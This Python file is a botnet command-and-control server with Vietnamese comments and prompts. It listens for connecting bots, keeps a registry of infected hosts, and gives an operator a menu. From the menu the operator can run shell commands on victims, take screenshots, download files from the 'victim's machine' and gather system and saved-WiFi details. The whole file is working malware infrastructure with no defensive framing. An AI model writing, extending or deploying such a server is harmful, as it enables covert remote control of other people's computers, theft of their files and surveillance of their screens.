#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import threading
import json
import base64
import os
from datetime import datetime

# Cấu hình
HOST = "0.0.0.0"
PORT = 5555

# Lưu trữ bot đã kết nối
connected_bots = {}  # {bot_id: {"socket": sock, "hostname": "...", "last_seen": "...", "info": {...}}}
command_counter = 0

def save_bot_info(bot_id, info):
    """Lưu thông tin bot vào file"""
    filename = f"bots/{bot_id}.json"
    os.makedirs("bots", exist_ok=True)
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(info, f, indent=2, ensure_ascii=False)

def load_all_bots():
    """Đọc tất cả thông tin bot đã lưu"""
    bots = {}
    os.makedirs("bots", exist_ok=True)
    for filename in os.listdir("bots"):
        if filename.endswith(".json"):
            bot_id = filename[:-5]
            with open(f"bots/{filename}", "r", encoding="utf-8") as f:
                bots[bot_id] = json.load(f)
    return bots

def show_menu():
    """Hiển thị menu điều khiển"""
    os.system("cls" if os.name == "nt" else "clear")
    print("=" * 60)
    print("          BOTNET C&C SERVER - CONTROL PANEL")
    print("=" * 60)
    print(f"Thời gian: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Bot đang online: {len(connected_bots)}")
    print("=" * 60)
    
    if connected_bots:
        print("\nDANH SÁCH BOT ĐANG ONLINE:")
        print("-" * 60)
        for bot_id, data in connected_bots.items():
            hostname = data.get("hostname", "Unknown")
            last_seen = data.get("last_seen", "N/A")
            print(f"  [{bot_id[:8]}...] | {hostname} | Last seen: {last_seen}")
    else:
        print("\n[!] Chưa có bot nào kết nối")
    
    print("\n" + "=" * 60)
    print("LỆNH ĐIỀU KHIỂN:")
    print("  1. Xem chi tiết 1 bot")
    print("  2. Gửi lệnh tới bot")
    print("  3. Xem tất cả bot đã từng kết nối")
    print("  4. Lấy thông tin hệ thống của bot")
    print("  5. Chụp màn hình bot")
    print("  6. Tải file từ bot")
    print("  7. Thực thi lệnh shell trên bot")
    print("  0. Thoát")
    print("=" * 60)

def view_bot_detail(bot_id):
    """Xem thông tin chi tiết của bot"""
    if bot_id not in connected_bots:
        print(f"Bot {bot_id} không online")
        return
    
    data = connected_bots[bot_id]
    info = data.get("info", {})
    print("\n" + "=" * 60)
    print(f"THÔNG TIN BOT: {bot_id}")
    print("=" * 60)
    
    if info:
        sys_info = info.get("system", {})
        net_info = info.get("network", {})
        print(f"Hostname: {sys_info.get('hostname', 'N/A')}")
        print(f"OS: {sys_info.get('os', 'N/A')}")
        print(f"Username: {sys_info.get('username', 'N/A')}")
        print(f"IP Local: {net_info.get('local_ip', 'N/A')}")
        print(f"IP Public: {net_info.get('public_ip', 'N/A')}")
        print(f"CPU: {sys_info.get('cpu_percent', 'N/A')}%")
        print(f"RAM: {sys_info.get('memory_used', 'N/A')}/{sys_info.get('memory_total', 'N/A')} GB")
        
        wifi = net_info.get("saved_wifi", [])
        if wifi:
            print(f"WiFi đã lưu: {', '.join(wifi[:5])}")
    else:
        print("Chưa có thông tin, hãy gửi lệnh get_info trước")
    
    input("\nNhấn Enter để tiếp tục...")

def send_command_to_bot(bot_id, cmd_type, **kwargs):
    """Gửi lệnh tới bot cụ thể"""
    global command_counter
    if bot_id not in connected_bots:
        print(f"Bot {bot_id} không online")
        return None
    
    command_counter += 1
    cmd = {
        "type": cmd_type,
        "cmd_id": command_counter,
        **kwargs
    }
    
    sock = connected_bots[bot_id]["socket"]
    try:
        sock.send(json.dumps(cmd).encode())
        
        # Nhận response
        sock.settimeout(30)
        response = sock.recv(65536).decode()
        return json.loads(response)
    except Exception as e:
        print(f"Lỗi: {e}")
        return None

def handle_bot(client_socket, address):
    """Xử lý kết nối từ bot"""
    bot_id = None
    hostname = None
    
    try:
        # Nhận thông tin đăng ký
        data = client_socket.recv(4096).decode()
        if data:
            register = json.loads(data)
            bot_id = register.get("bot_id")
            hostname = register.get("hostname")
        
        if bot_id:
            connected_bots[bot_id] = {
                "socket": client_socket,
                "address": address,
                "hostname": hostname,
                "last_seen": datetime.now().strftime("%H:%M:%S"),
                "info": {}
            }
            print(f"[+] Bot connected: {bot_id} ({hostname}) from {address}")
            
            # Vòng lặp nhận lệnh từ bot (bot sẽ chủ động gửi response)
            while True:
                data = client_socket.recv(65536).decode()
                if not data:
                    break
                
                try:
                    response = json.loads(data)
                    cmd_type = response.get("type", "")
                    bot_id_resp = response.get("bot_id")
                    
                    if cmd_type == "info_response" and bot_id_resp in connected_bots:
                        connected_bots[bot_id_resp]["info"] = response
                        save_bot_info(bot_id_resp, response)
                        print(f"[+] Received info from {bot_id_resp}")
                    
                    elif cmd_type == "exec_response":
                        print(f"\n[KẾT QUẢ LỆNH] {bot_id_resp}:")
                        print(response.get("output", "")[:500])
                    
                    elif cmd_type == "screenshot_response":
                        img_data = response.get("image")
                        if img_data:
                            filename = f"screenshots/{bot_id_resp}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
                            os.makedirs("screenshots", exist_ok=True)
                            with open(filename, "wb") as f:
                                f.write(base64.b64decode(img_data))
                            print(f"[+] Screenshot saved: {filename}")
                    
                    elif cmd_type == "download_response":
                        file_data = response.get("file_data")
                        filename = response.get("filename", "downloaded_file")
                        if file_data:
                            save_path = f"downloads/{bot_id_resp}_{filename}"
                            os.makedirs("downloads", exist_ok=True)
                            with open(save_path, "wb") as f:
                                f.write(base64.b64decode(file_data))
                            print(f"[+] File saved: {save_path}")
                            
                except json.JSONDecodeError:
                    pass
                    
        else:
            client_socket.close()
            
    except Exception as e:
        pass
    finally:
        if bot_id and bot_id in connected_bots:
            del connected_bots[bot_id]
            print(f"[-] Bot disconnected: {bot_id}")
        client_socket.close()

def main():
    """Main C2 server"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(100)
    
    print(f"[*] C2 Server listening on {HOST}:{PORT}")
    
    # Thread nhận kết nối bot
    def accept_bots():
        while True:
            client, addr = server.accept()
            thread = threading.Thread(target=handle_bot, args=(client, addr))
            thread.daemon = True
            thread.start()
    
    threading.Thread(target=accept_bots, daemon=True).start()
    
    # Menu điều khiển
    while True:
        show_menu()
        choice = input("\nChọn chức năng: ").strip()
        
        if choice == "0":
            print("Thoát...")
            break
        
        elif choice == "1":
            if not connected_bots:
                print("Không có bot nào online")
                input("Nhấn Enter...")
                continue
            print("\nDanh sách bot online:")
            for i, bot_id in enumerate(connected_bots.keys()):
                print(f"  {i+1}. {bot_id}")
            try:
                idx = int(input("Chọn bot (số): ")) - 1
                bot_id = list(connected_bots.keys())[idx]
                view_bot_detail(bot_id)
            except:
                print("Lựa chọn không hợp lệ")
        
        elif choice == "2":
            if not connected_bots:
                print("Không có bot nào online")
                input("Nhấn Enter...")
                continue
            print("\nDanh sách bot online:")
            for i, bot_id in enumerate(connected_bots.keys()):
                print(f"  {i+1}. {bot_id}")
            try:
                idx = int(input("Chọn bot (số): ")) - 1
                bot_id = list(connected_bots.keys())[idx]
                cmd_type = input("Lệnh (get_info/exec/screenshot/download/exit): ").strip()
                if cmd_type == "exec":
                    cmd = input("Nhập lệnh shell: ")
                    send_command_to_bot(bot_id, "exec", command=cmd)
                elif cmd_type == "download":
                    path = input("Đường dẫn file trên máy nạn nhân: ")
                    send_command_to_bot(bot_id, "download", path=path)
                elif cmd_type == "screenshot":
                    send_command_to_bot(bot_id, "screenshot")
                elif cmd_type == "get_info":
                    send_command_to_bot(bot_id, "get_info")
                elif cmd_type == "exit":
                    send_command_to_bot(bot_id, "exit")
                input("Đã gửi lệnh. Nhấn Enter...")
            except:
                print("Lỗi")
        
        elif choice == "3":
            all_bots = load_all_bots()
            print(f"\nTổng số bot đã từng kết nối: {len(all_bots)}")
            for bot_id, info in all_bots.items():
                hostname = info.get("system", {}).get("hostname", "Unknown")
                print(f"  - {bot_id}: {hostname}")
            input("\nNhấn Enter...")
        
        elif choice == "4":
            if not connected_bots:
                print("Không có bot nào online")
                input("Nhấn Enter...")
                continue
            print("\nDanh sách bot online:")
            for i, bot_id in enumerate(connected_bots.keys()):
                print(f"  {i+1}. {bot_id}")
            try:
                idx = int(input("Chọn bot (số): ")) - 1
                bot_id = list(connected_bots.keys())[idx]
                send_command_to_bot(bot_id, "get_info")
                print("Đã gửi lệnh lấy thông tin, kết quả sẽ hiển thị khi bot gửi về")
                input("Nhấn Enter...")
            except:
                pass
        
        elif choice == "5":
            if not connected_bots:
                print("Không có bot nào online")
                input("Nhấn Enter...")
                continue
            print("\nDanh sách bot online:")
            for i, bot_id in enumerate(connected_bots.keys()):
                print(f"  {i+1}. {bot_id}")
            try:
                idx = int(input("Chọn bot (số): ")) - 1
                bot_id = list(connected_bots.keys())[idx]
                send_command_to_bot(bot_id, "screenshot")
                print("Đã gửi lệnh chụp màn hình, ảnh sẽ lưu trong thư mục screenshots/")
                input("Nhấn Enter...")
            except:
                pass
        
        elif choice == "6":
            if not connected_bots:
                print("Không có bot nào online")
                input("Nhấn Enter...")
                continue
            print("\nDanh sách bot online:")
            for i, bot_id in enumerate(connected_bots.keys()):
                print(f"  {i+1}. {bot_id}")
            try:
                idx = int(input("Chọn bot (số): ")) - 1
                bot_id = list(connected_bots.keys())[idx]
                path = input("Đường dẫn file trên máy nạn nhân (VD: C:\\Users\\user\\Desktop\\file.txt): ")
                send_command_to_bot(bot_id, "download", path=path)
                print("Đã gửi lệnh tải file, file sẽ lưu trong thư mục downloads/")
                input("Nhấn Enter...")
            except:
                pass
        
        elif choice == "7":
            if not connected_bots:
                print("Không có bot nào online")
                input("Nhấn Enter...")
                continue
            print("\nDanh sách bot online:")
            for i, bot_id in enumerate(connected_bots.keys()):
                print(f"  {i+1}. {bot_id}")
            try:
                idx = int(input("Chọn bot (số): ")) - 1
                bot_id = list(connected_bots.keys())[idx]
                cmd = input("Nhập lệnh shell (VD: dir, ipconfig, whoami): ")
                send_command_to_bot(bot_id, "exec", command=cmd)
                print("Đã gửi lệnh, kết quả sẽ hiển thị ở đây sau vài giây")
                input("Nhấn Enter...")
            except:
                pass

if __name__ == "__main__":
    main()
